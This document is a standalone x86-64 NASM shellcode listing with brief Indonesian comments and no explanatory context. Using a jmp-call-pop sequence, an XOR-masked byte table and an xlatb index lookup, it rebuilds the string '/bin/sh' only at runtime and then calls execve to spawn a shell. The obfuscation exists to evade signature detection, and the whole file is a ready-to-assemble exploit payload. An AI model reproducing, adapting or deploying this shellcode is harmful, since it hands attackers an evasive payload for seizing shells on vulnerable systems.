BITS 64

_start:
    jmp short data

decoder:
    pop rsi                    ; RSI = payload

    lea rbx, [rsi + table - payload]  

    ; copy table ke stack
    mov rax, [rbx]
    mov [rsp-32], rax
    lea rbx, [rsp-32]

    ; mutate
    mov cl, 7
.mut:
    xor byte [rbx+rcx-1], 0x11
    loop .mut

    ; decode
    lea rdi, [rsp-16]
    mov cl, 8

.loop:
    lodsb
    xlatb
    stosb
    loop .loop

    xor eax, eax
    mov [rdi-1], al

    ; execve
    mov al, 59
    lea rdi, [rsp-16]
    xor esi, esi
    xor edx, edx
    syscall

data:
    call decoder

payload:
    db 0,1,2,3,0,4,5,6

table:
    db 0x2f ^ 0x11
    db 0x62 ^ 0x11
    db 0x69 ^ 0x11
    db 0x6e ^ 0x11
    db 0x73 ^ 0x11
    db 0x68 ^ 0x11
    db 0x01 ^ 0x11
